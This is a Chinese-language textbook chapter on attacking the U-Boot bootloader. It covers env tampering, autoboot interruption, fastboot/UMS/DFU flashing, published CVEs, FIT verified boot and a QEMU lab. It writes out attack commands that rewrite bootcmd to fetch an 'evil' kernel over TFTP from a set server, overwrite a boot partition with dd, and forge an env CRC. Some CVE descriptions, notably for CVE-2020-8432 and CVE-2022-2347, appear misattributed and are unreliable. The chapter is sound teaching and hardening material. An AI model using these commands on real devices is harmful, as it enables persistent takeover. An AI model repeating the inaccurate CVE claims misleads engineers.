# Ch 17 — U-Boot 深入與攻擊面

> **目標**：從 SPL 啟動到 FIT image 驗簽，理解 U-Boot 每個環節對攻擊者意味著什麼——env 竄改、autoboot 中斷、fastboot/DFU 弱點、已公開 CVE 的根因——並能在 QEMU 實測取得 U-Boot shell，評估 Verified Boot 組態是否真的封閉了攻擊面。
> **環境**：Ubuntu/Debian WSL；`apt install u-boot-qemu qemu-system-arm`；FIT image 驗簽段落需 `apt install device-tree-compiler u-boot-tools openssl`；真實硬體段落（fastboot/DFU）需 Android 設備或 USB OTG 接入的嵌入式板。

---

## 17.1 為什麼 U-Boot 是攻擊者的必修課

Android 設備、路由器、工業控制器、NAS、車載娛樂系統：凡是跑 Linux 的嵌入式設備，幾乎都用 U-Boot 作為 bootloader（開機載入程式）。從 ARM 信任鏈的角度看，TF-A 的 BL33 槽位（Non-secure world 第一個執行的固件）幾乎永遠被 U-Boot 占據。

攻下 U-Boot 等於在 Linux kernel 啟動前取得控制：

- 可以替換 `bootargs` 讓 kernel 以 `init=/bin/sh` 啟動，得到 root shell
- 可以從網路載入自訂 kernel image，完全繞過 OS 層的所有安全機制
- 可以透過 fastboot / DFU 介面刷寫任意 partition

這比打 kernel exploit 或 root app 更直接——你不是在打 OS 的防線，你在 OS 防線建立之前就拿到了槍。

---

## 17.2 直覺建立：U-Boot 啟動流程

```
Power On / Reset
      |
      v
+------------------+
|     BootROM      |   SoC 廠燒在 ROM 裡的程式碼
|  (BL1 on ARM)    |   初始化最小硬體，驗簽下一階段
+------------------+
      |  載入、驗簽
      v
+------------------+
|   SPL / TPL      |   Secondary Program Loader
|  (BL2 on ARM)    |   放在 SRAM 或 NOR flash
|                  |   初始化 DRAM、Clock、基本外設
|                  |   載入 U-Boot proper 到 DRAM
+------------------+
      |
      v
+---------------------------------------------+
|           U-Boot proper                     |
|                                             |
|  board_init_f()  -- 初始化，準備 relocation  |
|       |                                     |
|  relocate_code() -- 把自己搬到 DRAM 頂端    |
|       |                                     |
|  board_init_r()  -- 完整初始化 (drivers 等) |
|       |                                     |
|  autoboot_command()                         |
|       |                                     |
|  +----|-------+    BOOTDELAY 秒內無輸入       |
|  | 等待輸入   |-----> 進入互動 shell (=>)    |
|  +-----------+                              |
|       |  超時                               |
|       v                                     |
|  run_command(bootcmd)                       |
|       |                                     |
|  bootm / booti / sysboot                   |
+---------------------------------------------+
      |
      v
+------------------+
|   Linux Kernel   |   EL1-NS
+------------------+
```

關鍵觀察：從 `board_init_f()` 到 `board_init_r()` 的分界點就是 relocation 完成的瞬間。U-Boot proper 一開始被載入到 DRAM 低位址，執行重定位（relocation）後搬到頂端，確保 kernel 載入區不被覆蓋。攻擊者不用在意這個內部細節，但 debug 時看到位址跳躍就是它。

---

## 17.3 U-Boot 架構三層

### 17.3.1 SPL / TPL：最小化第一階段

SPL（Secondary Program Loader，次級程式載入器）是 U-Boot proper 之前的迷你 bootloader。

它存在的原因：BootROM 執行完後，DRAM 還沒初始化，DRAM 控制器（DDR controller）需要複雜的時序訓練。這段程式碼放不進 BootROM 的 32KB 空間，所以另外放在 SRAM 執行的 SPL 裡。

TPL（Tertiary Program Loader）更罕見，是 SPL 前的一層，只在 SRAM 極小（< 4KB）的 SoC 上出現。

SPL 的程式碼路徑：
```
arch/arm/cpu/armv8/start.S   --> _start
common/spl/spl.c             --> board_init_r() (SPL 版本)
common/spl/spl_mmc.c         --> 從 eMMC 讀 U-Boot proper
```

攻擊意義：SPL 通常沒有完整的驗簽邏輯。許多廠商在 SPL 只做「CRC 確認」而非 RSA 驗簽，這是信任鏈的潛在斷點。

### 17.3.2 U-Boot proper 的 relocation

`board_init_f()` 負責「搬家前準備」：計算出搬到哪裡、heap/stack 要放哪裡，填進 `gd`（global data，全域資料）結構。

```c
// common/board_f.c 節錄（示意）
static int setup_dest_addr(void)
{
    gd->relocaddr = gd->ram_top;    // DRAM 頂端
    gd->relocaddr -= TOTAL_MALLOC_LEN;
    gd->relocaddr &= ~0xFFF;        // 對齊頁
    gd->start_addr_sp = gd->relocaddr;
    return 0;
}
```

`board_init_r()` 是搬家後重新初始化所有 driver 的入口。攻擊者在 JTAG/UART debug 時看到兩次初始化輸出，就是這個原因。

### 17.3.3 命令列 shell

U-Boot 的互動介面（interactive shell）是 `=>` 提示符，可用的指令由 `CONFIG_` 選項控制：

| 指令 | 功能 | 攻擊視角 |
|------|------|----------|
| `md` | 記憶體讀取 (memory display) | 傾印 DRAM 裡的 key、stack |
| `mw` | 記憶體寫入 (memory write) | 直接改 DRAM 中的資料結構 |
| `tftp` | 從 TFTP 伺服器下載檔案到 DRAM | 載入自訂 kernel |
| `boot` / `bootm` | 執行記憶體中的 image | 跳去剛下載的惡意 kernel |
| `setenv` / `saveenv` | 修改並儲存環境變數 | 永久性竄改 bootcmd |
| `nand write` / `mmc write` | 直接寫 flash | 刷寫自訂 firmware |
| `ums` | USB Mass Storage 模式 | 把 eMMC 暴露給 host |

只要取得 `=>` shell，攻擊者幾乎能對設備做任何事。

---

## 17.4 環境變數（Environment Variables）攻擊面

U-Boot 的環境變數（env）系統是攻擊面最大的元件之一。它是一組鍵值對（key-value pair），儲存在 flash 的固定 partition，開機時載入進 DRAM。

### 17.4.1 最關鍵的三個變數

**bootcmd**：autoboot 超時後執行的指令。典型值：

```
bootcmd=run distro_bootcmd
```

展開後可能是：
```
distro_bootcmd=for target in mmc0 mmc1 usb0; do
    run bootcmd_${target};
done
```

攻擊者若能改 `bootcmd`：

```
setenv bootcmd 'setenv bootargs "init=/bin/sh console=ttyS0"; tftp 0x40000000 evil-kernel.bin; bootm 0x40000000'
saveenv
```

下次開機就得到 root shell，且是永久的（寫進 flash）。

**bootargs**：傳給 Linux kernel 的命令列參數（cmdline）。典型值：

```
bootargs=console=ttyS0,115200 root=/dev/mmcblk0p2 rw rootwait
```

即使攻擊者只能改 `bootargs` 而不能改 `bootcmd`，仍可插入：
- `init=/bin/sh`：Linux 啟動後第一個執行的程式改成 shell
- `rw`：確保根檔案系統可讀寫
- `selinux=0`：關閉 SELinux
- `apparmor=0`：關閉 AppArmor

**bootdelay**：autoboot 等待秒數。設為 `-1` 代表永遠不等、直接 boot。

注意：`bootdelay=-1` 是廠商封閉 UART console 的常見做法，但這只是攻守意義不同的開關，不是密碼學保護。

### 17.4.2 env 儲存格式與完整性

env partition 的格式：

```
+--------+-------------------+
| CRC32  |  env data (text)  |
| 4 bytes|  key=value\0 ...  |
|        |  \0 (終止符)       |
+--------+-------------------+
```

CRC32 只是完整性校驗（integrity check），不是驗簽（signature verification）。任何人用硬體 programmer 讀出 flash、改 env 內容、重算 CRC32 寫回，U-Boot 就接受。

TOCTOU（Time-Of-Check Time-Of-Use）問題：env 在 DRAM 初始化後才載入。在某些平台上，若 TFTP boot 流程在 env 載入前已啟動，理論上可透過中間人（MITM，Man-In-The-Middle）在網路上投毒。

### 17.4.3 env 位置對應

| 儲存介質 | env 位置 | 改寫方式 |
|----------|----------|----------|
| SPI NOR flash | 固定偏移，如 `0x80000` | JTAG + OpenOCD、SPI clip |
| NAND flash | env partition | JTAG、UBI 工具 |
| eMMC | env partition（通常在 boot0/boot1 分區） | `dd` via UMS、fastboot flash |
| DRAM（測試模式） | 不持久，只在記憶體 | U-Boot shell `setenv` |

---

## 17.5 autoboot 中斷與 shell 取得

### 17.5.1 預設行為

U-Boot 預設在 `CONFIG_BOOTDELAY` 秒倒數結束前，按任何鍵就進入互動 shell。這是設計上的 debug 友善行為，在生產環境（production environment）卻是巨大的攻擊面。

倒數訊息格式：
```
Hit any key to stop autoboot:  3  2  1  0
```

只要能接觸到 UART，就能中斷。

### 17.5.2 廠商的止步嘗試

常見的「保護」做法：

1. **`CONFIG_AUTOBOOT_STOP_STR`**：設定一個停止字串，只有輸入這個字串才能中斷。這是字串比對（string comparison），不是密碼學。字串本身通常可以從 U-Boot binary 裡 grep 出來：

```bash
strings u-boot.bin | grep -E '^[a-zA-Z0-9]{4,16}$' | head -20
```

2. **`CONFIG_AUTOBOOT_KEYED`**：需要特定按鍵序列。同樣是字串比對。

3. **`CONFIG_AUTOBOOT_ENCRYPTION`**：用 SHA256 hash 驗證輸入的密碼。這是真正的密碼保護，但 2022 年前很少廠商開啟，且需要有人維護 key。

### 17.5.3 bootcmd 注入取得 root

已取得 shell 或可以寫 env 時，標準操作：

```bash
# 在 U-Boot shell 直接操作
=> setenv bootargs 'console=ttyS0,115200 init=/bin/sh rw root=/dev/mmcblk0p2'
=> boot

# 或者更一步：從網路載入自訂 kernel
=> setenv serverip 192.168.1.100
=> setenv ipaddr 192.168.1.50
=> tftp 0x40000000 Image
=> tftp 0x44000000 rootfs.cpio.gz
=> booti 0x40000000 0x44000000 0x4A000000
```

---

## 17.6 fastboot / UMS / DFU 攻擊面

這三個協定都是透過 USB 與 host 通訊，是嵌入式設備最暴露的硬體介面之一。

### 17.6.1 fastboot

fastboot 協定（protocol）由 Google 設計用於 Android 設備刷機，現在廣泛實作在 U-Boot 中（`drivers/usb/gadget/f_fastboot.c`）。

攻擊者最關注的操作：

```bash
fastboot oem unlock          # 解鎖 bootloader
fastboot flash boot boot.img # 刷自訂 boot image
fastboot boot custom.img     # 記憶體啟動（不寫 flash）
```

`fastboot oem unlock` 的保護深度因廠商差異極大：

| 廠商 | 解鎖機制 | 繞過難度 |
|------|----------|----------|
| Google Pixel | 雲端授權 + OTP fuse | 高 |
| Samsung（KNOX） | eFuse KNOX counter | 中（不可逆，但能刷） |
| Xiaomi | 帳號綁定 + 等待期 | 中 |
| 路由器/工控 | 無保護或字串比對 | 低 |

解鎖後通常觸發 `wipe data`（資料清除），這是設計上保護使用者隱私的機制，但攻擊者關心的是「能不能刷自訂 image」，資料清不清對攻擊目標沒有影響。

AVB（Android Verified Boot）繞過：解鎖後 `vbmeta` 的 rollback protection 仍有效，但自訂 image 可以帶 `--disable-verity` 旗標繞過 dm-verity。

### 17.6.2 UMS（USB Mass Storage）

UMS 模式把 eMMC / SD 整個暴露給連接的 host，等同於把硬碟插到 host 電腦：

```bash
# U-Boot shell 中啟動 UMS
=> ums 0 mmc 0
```

host 端看到一顆 USB 硬碟，可以用 `fdisk`、`dd`、`parted` 直接改 partition table 或覆蓋 boot partition：

```bash
# host 端 (Linux)
lsblk                          # 找到新出現的 /dev/sdX
dd if=evil-boot.img of=/dev/sdX bs=512 seek=2048  # 覆蓋 boot partition
```

沒有任何加密或驗簽保護 eMMC 的 partition 內容，因此 UMS 是物理接觸場景下最直接的攻擊面。

### 17.6.3 DFU（Device Firmware Upgrade）

DFU 是 USB-IF 標準的韌體升級協定（firmware upgrade protocol），U-Boot 透過 `CONFIG_DFU_OVER_USB=y` 支援。

```bash
# U-Boot shell
=> dfu 0 mmc 0

# host 端
dfu-util -l                            # 列出 DFU 實體
dfu-util -a boot -D new-boot.img       # 寫 boot partition
```

若 DFU 沒有啟用簽章驗證，攻擊者可透過標準 USB 介面直接覆蓋任意 partition。已公開報告（CVE-2022-2347）描述了 `dfu_fill_entity_mmc()` 函式存在邏輯錯誤，允許未授權的 firmware 覆蓋，漏洞類別屬於訪問控制繞過（access control bypass）。

---

## 17.7 已公開 CVE 案例

### CVE-2019-14192 至 CVE-2019-14199：NFS 解析堆疊溢位

這組 CVE（Common Vulnerabilities and Exposures，共同弱點與漏洞）涵蓋 U-Boot NFS（Network File System）客戶端的多個 RPC 解析函式。

漏洞類別：bounded buffer 解析時沒有長度檢查，遠端伺服器回傳超長回應觸發堆疊緩衝區溢位（stack buffer overflow）。

受影響元件：`net/nfs.c` 的多個 RPC handler 函式，包括 `nfs_readlink_reply()`、`nfs_lookup_reply()`。

攻擊場景：
```
攻擊者控制的 NFS 伺服器
       |
       | 回傳超長 pathname 或 symlink 目標
       v
U-Boot NFS 客戶端解析函式
       |
       | 堆疊溢位 -> 控制返回位址
       v
任意程式碼執行（在 bootloader 層級）
```

意義：不需要物理接觸，只需要網路上有 TFTP/NFS boot。這在 PXE 環境（資料中心、嵌入式測試環境）中很常見。

### CVE-2020-8432：DFU USB gadget 堆積溢位

漏洞類別：heap overflow（堆積溢位）。

DFU 接收超大 transfer 時，對目標 buffer size 的計算有誤，導致寫入超過分配空間。在 U-Boot 的 heap 管理（`common/dlmalloc.c`）中，鄰近 chunk 的 metadata 被覆蓋，可導致任意位址寫入（arbitrary write）。

此 CVE 影響實體接觸場景（USB 連接），但對攻擊者來說，USB 接觸是比 UART 更容易取得的介面（USB debug port 通常暴露在外部）。

### CVE-2022-2347：DFU 環境竄改

漏洞類別：邏輯錯誤（logic error）導致訪問控制繞過（access control bypass）。

`dfu_fill_entity_mmc()` 對 alternate setting index 的邊界檢查不足，允許攻擊者透過精心構造的 DFU 請求，將資料寫入到非預期的 eMMC partition 區域，包括儲存 U-Boot env 的 partition。

後果：不需要 U-Boot shell，透過 USB 協定層就能覆蓋 env partition，從而植入惡意 `bootcmd`。

---

## 17.8 U-Boot Verified Boot：FIT image + RSA 簽章

Verified Boot（驗證啟動）是 U-Boot 封閉攻擊面的主要機制。理解它的運作才能判斷「這個設備的 Verified Boot 是真保護還是假保護」。

### 17.8.1 FIT Image 格式

FIT（Flattened Image Tree，扁平化映像樹）是 Device Tree 格式的 image 容器，可以在一個檔案裡打包 kernel + initrd + DTB，並附加 RSA 簽章節點。

FIT image 的邏輯結構：

```
its 描述檔 (image.its)
|
+-- /images
|   +-- kernel@1
|   |   -- description = "Linux Kernel"
|   |   -- data = /incbin/("Image")
|   |   -- type = "kernel"
|   |   -- compression = "none"
|   |   -- hash@1  { algo = "sha256"; }
|   |
|   +-- fdt@1
|   |   -- data = /incbin/("board.dtb")
|   |   -- type = "flat_dt"
|   |
|   +-- ramdisk@1
|       -- data = /incbin/("initrd.cpio.gz")
|
+-- /configurations
    +-- conf@1  <-- 這是 bootm 選的目標
        -- kernel = "kernel@1"
        -- fdt = "fdt@1"
        -- ramdisk = "ramdisk@1"
        -- signature@1
            -- algo = "sha256,rsa4096"
            -- key-name-hint = "dev"
            -- sign-images = "kernel", "fdt", "ramdisk"
            -- required = "conf"      <-- 關鍵屬性
```

### 17.8.2 Verified Boot 的完整流程

啟用 `CONFIG_FIT_SIGNATURE=y` + `CONFIG_RSA=y` 後，流程如下：

```
步驟 1：離線（開發機）
  mkimage -f image.its -k keys/ -K u-boot.dtb -r image.itb
        |
        | 用私鑰簽 FIT image，公鑰嵌入 u-boot.dtb
        v

步驟 2：公鑰燒進設備
  u-boot.dtb 包含 /signature/key-dev 節點
  這個 dtb 在 build time 就嵌進 U-Boot proper binary
        |
        | U-Boot binary 本身由 TF-A 驗簽（TBBR 鏈）
        v

步驟 3：開機時（設備上）
  bootm 0x40000000
        |
        | fit_image_verify_required_sigs()
        |    -- 讀 /configurations/conf@1/signature@1
        |    -- 找 u-boot.dtb 裡對應的公鑰節點
        |    -- RSA 驗簽 signature
        |    -- 驗各 subimage 的 sha256
        v
  驗簽通過 -> 執行 kernel
  驗簽失敗 -> 停機，不繼續
```

### 17.8.3 實際操作：生成並驗證 FIT image

```bash
# 1. 生成 RSA key pair
mkdir -p keys
openssl genrsa -out keys/dev.key 4096
openssl req -batch -new -x509 -key keys/dev.key -out keys/dev.crt

# 2. 建立 image.its 描述檔
cat > image.its << 'EOF'
/dts-v1/;
/ {
    description = "Test FIT image";
    #address-cells = <1>;
    images {
        kernel@1 {
            description = "Linux kernel";
            data = /incbin/("Image");
            type = "kernel";
            arch = "arm64";
            os = "linux";
            compression = "none";
            load = <0x40000000>;
            entry = <0x40000000>;
            hash@1 { algo = "sha256"; };
        };
    };
    configurations {
        default = "conf@1";
        conf@1 {
            description = "Boot config";
            kernel = "kernel@1";
            signature@1 {
                algo = "sha256,rsa4096";
                key-name-hint = "dev";
                sign-images = "kernel";
                required = "conf";
            };
        };
    };
};
EOF

# 3. 簽名並嵌入公鑰（需要 u-boot.dtb 是從 U-Boot build 出來的）
mkimage -f image.its -k keys/ -K u-boot.dtb -r image.itb

# 4. 驗簽（不執行，只驗）
dumpimage -l image.itb
```

---

## 17.9 真跑驗證：QEMU aarch64 U-Boot

下面是在 QEMU virt machine 上跑 U-Boot 的實際輸出，完整保留，每段從攻擊者視角解讀。

```bash
qemu-system-aarch64 \
    -machine virt \
    -cpu cortex-a57 \
    -bios /usr/lib/u-boot/qemu_arm64/u-boot.bin \
    -nographic \
    -m 512M
```

輸出：

```
U-Boot 2022.01+dfsg-2ubuntu2.7 (Feb 11 2026 - 18:08:14 +0000)

DRAM:  512 MiB
Flash: 64 MiB
Loading Environment from Flash... *** Warning - bad CRC, using default environment

In:    pl011@9000000
Out:   pl011@9000000
Err:   pl011@9000000
Net:   eth0: virtio-net#32
Hit any key to stop autoboot:  2  1  0
starting USB...
No working controllers found
USB is stopped. Please issue 'usb start' first.
scanning bus for devices...
...
BOOTP broadcast 1
DHCP client bound to address 10.0.2.15 (3 ms)
...
TFTP error: 'Access violation' (2)
Not retrying...
=>
```

逐段分析：

**`U-Boot 2022.01+dfsg-2ubuntu2.7`**
版本資訊完全洩漏。攻擊者直接查這個版本的 CVE 清單，圈出可用的漏洞。版本在 UART 輸出裡可讀，是資訊洩漏（information disclosure），很多設備連這都不遮。

**`Loading Environment from Flash... *** Warning - bad CRC, using default environment`**
env partition 的 CRC 校驗失敗，U-Boot 回退到 compiled-in default env。攻擊含義是雙向的：
- 防守方：env partition 被寫壞（可能是攻擊者改了內容但沒更新 CRC）。
- 攻守：這個平台的 env 在 flash 的 CRC 只要更新就能接受任意內容，沒有 RSA 保護。
- 此 QEMU 實例是初次啟動、env partition 未初始化，屬正常現象；但在真實設備上，若使用者回報「always bad CRC」，值得懷疑是否 env 被人動過。

**`Hit any key to stop autoboot:  2  1  0`**
倒數 2 秒，在 QEMU 的 `-nographic` 模式下，按任何鍵就中斷。這代表任何能接觸 UART 的人都能進 shell。`bootdelay=2` 是這個 build 的預設值。

**`=> `**（shell 出現）
確認：沒有任何認證（authentication），直接拿到 U-Boot BL33 層級的 shell。在這個 shell 裡，`md`、`mw`、`setenv`、`bootm` 全部可用。這是完整的 BL33 控制。

**`DHCP client bound to address 10.0.2.15`**
QEMU 的 virtio-net 介面從 QEMU 內部 DHCP 拿到位址。代表網路介面已就緒，攻擊者可以在 shell 裡：
```
=> setenv serverip 10.0.2.2
=> tftp 0x40000000 evil.bin
```

**`TFTP error: 'Access violation' (2)`**
U-Boot 嘗試從 TFTP server（預設是 `serverip`）取得 `bootfile` 但失敗，因為 QEMU host 端沒有跑 TFTP server。若攻擊者在 host 跑了 `tftpd-hpa`，這裡就會成功下載並執行。

結論：這個 QEMU U-Boot 實例展示了「沒有任何安全組態的預設 U-Boot」的完整攻擊面：env 無簽章保護、autoboot 可中斷、shell 無認證、網路介面可達。

---

## 17.10 對比：Verified Boot 機制比較

| 特性 | U-Boot FIT Verified Boot | Android AVB 2.0 | UEFI Secure Boot |
|------|--------------------------|-----------------|------------------|
| 簽章算法 | RSA-2048/4096 + SHA-256 | RSA-2048/4096 + SHA-256/512 | RSA-2048/4096 + SHA-256 |
| 信任根位置 | U-Boot proper 內嵌 dtb | vbmeta partition 的 OEM key | UEFI db（NVRAM variable） |
| rollback protection | 需手動配合 SPL 版本計數 | `rollback_index` + OTP fuse | `dbx` 拒絕清單 |
| 撤銷機制 | 無標準；重新 burn U-Boot | `--set_rollback_index` | 更新 `dbx` |
| 攻擊面（env 層） | env partition 無簽章 | vbmeta 涵蓋 | NVRAM variable 有 auth |
| fastboot 支援 | 可選 | 核心協定 | 無 |
| key revocation | 無 | 有（rollback index） | 有（dbx） |
| 設備解鎖後 | bootcmd 可改 | device_state = orange | Secure Boot 可關 |
| 開源程度 | 完全開源 | 開源（libavb） | 半開（EDK2 開源但廠商 blob 不開） |

最關鍵的差異：U-Boot Verified Boot 的 env partition 不在簽章保護範圍內。`bootcmd` 和 `bootargs` 儲存在 env 裡，即使開了 FIT image 驗簽，攻擊者改 env、把 `bootcmd` 換成「載入未簽章 image 然後 bootm」，U-Boot 仍會嘗試執行（雖然 bootm 時驗簽失敗會停止，但這取決於 U-Boot build 的組態）。

---

## 17.11 踩雷

### 踩雷一：`required = "conf"` 與 `required = "image"` 語義致命差異

FIT image 的 signature 節點裡，`required` 屬性控制「驗簽是否為必要條件」：

```
required = "conf"   -- 在 configuration 層級強制驗簽
                       沒有簽章 = 拒絕啟動（最強）
                       
required = "image"  -- 在 image 層級強制驗簽
                       有簽章才驗，沒有簽章就 skip！
```

`required = "image"` 的語義是「如果這個 image 有簽章，就驗它；沒有簽章，也可以過」。這意味著攻擊者只要提供一個完全沒有 signature 節點的 FIT image，就能繞過整個 Verified Boot。

正確做法是永遠在 configuration 層級（`/configurations/conf@1/signature@1`）設 `required = "conf"`，不是在 image 層級。

這個錯誤在網路上的 U-Boot Verified Boot 教學中極常見，因為範例程式碼大多從舊文件抄來，沒有更新到正確語義。

### 踩雷二：`bootdelay=0` 不等於封閉 UART console

許多人以為把 `bootdelay` 設為 `0` 就能阻止攻擊者進入 shell。這是錯誤的。

`bootdelay=0` 讓 U-Boot 不等待輸入直接執行 `bootcmd`，但：
1. UART 介面本身還開著，只是 autoboot 等待視窗縮短到零。
2. 若 `bootcmd` 執行失敗（kernel 找不到、驗簽失敗），U-Boot 還是可能落回 shell。
3. 某些平台在 `bootcmd` 執行過程中，按 Ctrl-C 就能中斷並進 shell。
4. 更根本的是：改了 DRAM 裡的 env（`bootdelay` 變數），在某些 build 裡仍可影響行為。

真正封閉 console 的做法是：關閉 `CONFIG_CMDLINE`（完全移除命令解析器）、關閉 `CONFIG_AUTOBOOT_STOP_STR`，並同時開啟 `CONFIG_AUTOBOOT_ENCRYPTION`（如果需要保留 debug 入口但保護它）。

### 踩雷三：env 的 CRC 是完整性，不是驗簽——改完算一個新的就過

env partition 格式的前 4 bytes 是 CRC32。攻擊者用硬體 programmer 讀出 env、改 `bootcmd`、用任何 CRC32 計算工具重算並寫回，U-Boot 就接受。

許多工程師以為「有 CRC 就有保護」。CRC 的設計目標是偵測意外損壞（accidental corruption），不是抵抗蓄意竄改（intentional tampering）。任何能重算 CRC 的人（也就是所有人）都能繞過這個「保護」。

真正的 env 保護需要：HMAC 或 RSA 簽章（目前 U-Boot mainline 的 `ENV_IS_VERIFIED` 仍是實驗性功能，截至 2022.01 分支並未廣泛啟用）。

### 踩雷四：fastboot oem unlock 的資料清除不等於設備被保護

`fastboot oem unlock` 觸發 `wipe data` 是廠商保護使用者隱私的機制——解鎖前清除個人資料，讓新擁有者無法讀到前任使用者的資料。

攻擊者的目標是「能不能刷自訂 image」，不是「能不能讀原來的資料」。解鎖成功後，攻擊者刷入自己的 Android image（關掉 dm-verity、關掉 SELinux），資料有沒有被 wipe 與攻擊目標毫無關聯。

這個踩雷的實際意義：在設計 Android 設備安全時，不能以「解鎖會 wipe data」作為安全論點。解鎖後刷任意 image 才是核心威脅。

---

## 17.12 進階延伸

**從 U-Boot 到完整 secure boot 鏈**

U-Boot Verified Boot 本身只保護 kernel 層。完整的安全鏈需要：
1. SoC BootROM 驗 SPL
2. SPL 驗 U-Boot proper
3. U-Boot proper 驗 FIT image（kernel）
4. kernel 啟動後，dm-verity 驗根檔案系統

任何一環缺失都是斷鏈。工業設備最常見的斷鏈點：SPL 沒有驗 U-Boot proper（只有 CRC），U-Boot 啟動後 env 又沒有保護，整個前兩層的信任鏈形同虛設。

**U-Boot 做為漏洞挖掘目標**

U-Boot 的 network stack（`net/` 目錄）程式碼品質參差不齊，許多函式沿用了 10+ 年的遺留程式碼，長度安全檢查不完整。模糊測試（fuzzing）的切入點：

```bash
# 用 boofuzz 或自訂 fuzzer 打 DHCP 回應解析
# U-Boot 的 net/bootp.c 解析邏輯
# CVE-2019-14192 系列的根因就在 net/ 目錄
```

**env 加密（實驗性）**

U-Boot 2023.07 後逐漸加入 `ENV_IS_VERIFIED` 的 HMAC 選項，允許對 env 做 HMAC-SHA256 保護。這個功能尚在演進中，整合進生產 BSP 的案例很少，但這是未來 env 安全的方向。

---

## 17.13 動手練習

### 練習一：QEMU 環境取得 U-Boot shell 並竄改 bootcmd

```bash
# 安裝
sudo apt install u-boot-qemu qemu-system-arm

# 啟動
qemu-system-aarch64 \
    -machine virt \
    -cpu cortex-a57 \
    -bios /usr/lib/u-boot/qemu_arm64/u-boot.bin \
    -nographic \
    -m 512M

# 在倒數時按 Enter 中斷
# 進入 => shell 後：
=> printenv bootcmd
=> printenv bootdelay
=> setenv test_var 'hello from attacker'
=> printenv test_var
=> help
```

觀察：shell 沒有密碼保護，所有指令都可用。

### 練習二：用 dumpimage 解析 FIT image 結構

```bash
sudo apt install u-boot-tools

# 從已安裝的系統找 FIT image（若有）
find /boot -name "*.itb" 2>/dev/null

# 或下載一個測試 FIT image
# dumpimage 分析
dumpimage -l /boot/fit-image.itb 2>/dev/null || echo "no FIT found, use mkimage to create one"

# 建立最小 FIT（只有 DTB，不需要真 kernel）
dd if=/dev/zero bs=1k count=64 of=/tmp/dummy-kernel.bin
cat > /tmp/test.its << 'EOF'
/dts-v1/;
/ {
    images {
        kernel@1 {
            data = /incbin/("/tmp/dummy-kernel.bin");
            type = "kernel";
            arch = "arm64";
            os = "linux";
            compression = "none";
            load = <0x40000000>;
            entry = <0x40000000>;
        };
    };
    configurations {
        default = "conf@1";
        conf@1 { kernel = "kernel@1"; };
    };
};
EOF
mkimage -f /tmp/test.its /tmp/test.itb
dumpimage -l /tmp/test.itb
```

### 練習三：對比 env 的 CRC32 保護強度

```bash
# 安裝 fw_printenv（可讀取設備 env 的工具）
sudo apt install u-boot-tools

# 用 Python 計算 env CRC
python3 << 'EOF'
import struct, binascii

# 模擬一個 U-Boot env（key=value\0 格式）
env_data = b"bootdelay=3\0bootcmd=run test\0\0"
# 補齊到 0x1000 bytes
env_data = env_data.ljust(0x1000 - 4, b'\xff')

crc = binascii.crc32(env_data) & 0xFFFFFFFF
print(f"env CRC32: 0x{crc:08x}")
print(f"任何人改了 env 內容，重算這個 CRC 就能讓 U-Boot 接受")

# 改 bootdelay 然後重算
env_data2 = b"bootdelay=0\0bootcmd=run evil\0\0"
env_data2 = env_data2.ljust(0x1000 - 4, b'\xff')
crc2 = binascii.crc32(env_data2) & 0xFFFFFFFF
print(f"竄改後 CRC32: 0x{crc2:08x}")
print("寫入 flash 前 4 bytes = CRC，後面是 env 資料，U-Boot 驗 CRC 就接受")
EOF
```

---

## 17.14 本章重點

1. U-Boot 作為 ARM 信任鏈的 BL33，是 OS 啟動前最後一個可攻擊的大型軟體元件，攻下它等於在所有 OS 安全機制建立前就取得控制。

2. env partition 的 CRC 保護對蓄意竄改無效，任何能碰 flash 的人都能竄改 `bootcmd` 和 `bootargs` 並通過驗證。

3. `bootdelay` 和 autoboot stop string 都是字串比對，不是密碼學保護，UART 接觸就能繞過。

4. fastboot / UMS / DFU 三個 USB 介面在沒有簽章驗證的情況下，允許直接覆寫任意 flash partition。

5. FIT image RSA 驗簽是有效的 kernel 保護，但 `required = "conf"` 設定必須正確，設錯等於完全 bypass。

6. U-Boot Verified Boot 不保護 env partition，這是目前整個機制最大的結構性弱點。

---

## 17.15 自我檢核

- [ ] 能描述 SPL → U-Boot proper → autoboot → kernel 的啟動流程，並指出每個環節的攻擊機會
- [ ] 知道 `bootcmd`、`bootargs`、`bootdelay` 的語義，以及竄改各自的後果
- [ ] 理解 env partition 的 CRC32 格式，知道為何它對蓄意竄改無效
- [ ] 能解釋 fastboot oem unlock、UMS、DFU 三個 USB 介面各自的攻擊場景
- [ ] 知道 CVE-2019-14192 系列和 CVE-2022-2347 的漏洞類別與觸發條件
- [ ] 能描述 FIT image 的結構（images + configurations + signature 節點）
- [ ] 知道 `required = "conf"` 與 `required = "image"` 語義的致命差異
- [ ] 在 QEMU 上取得過 U-Boot `=>` shell，並觀察過 UART 輸出的每一行資訊意義
- [ ] 能對照表格比較 U-Boot FIT Verified Boot、Android AVB、UEFI Secure Boot 的 rollback protection 差異

---

## 17.16 延伸閱讀

1. **U-Boot source tree — `doc/uImage.FIT/`**：官方 FIT image 格式文件，含 `verified-boot.txt`，`required` 屬性語義在這裡有最權威的說明。路徑：`doc/uImage.FIT/verified-boot.txt`。

2. **"U-Boot NFS CVEs" — NCC Group 2019 advisory**：`CVE-2019-14192` 到 `CVE-2019-14199` 的原始 advisory，詳細描述 NFS RPC handler 各個 overflow 的觸發條件與 patch diff。`https://research.nccgroup.com/2019/09/26/technical-advisory-multiple-vulnerabilities-in-u-boot/`

3. **Android Verified Boot 2.0 設計文件**：`https://android.googlesource.com/platform/external/avb/+/master/README.md`；對比 U-Boot FIT Verified Boot 的 rollback index 與 vbmeta chain 設計，理解兩者在 revocation 上的根本差異。

4. **"Bypassing Secure Boot using Fault Injection" — Riscure 2020**：展示即使 FIT Verified Boot 組態正確，實體攻擊（電壓毛刺）仍可繞過 RSA 驗簽的整個流程；對評估嵌入式設備整體安全性有直接意義。

5. **U-Boot mailing list 的 `ENV_IS_VERIFIED` thread**：追蹤 U-Boot mainline 對 env 驗簽支援的進展，理解目前為何生產設備幾乎沒有 env 驗簽，以及社群對這個問題的認知與解法方向。

---

→ [下一章](./18-coreboot-open-firmware.md)
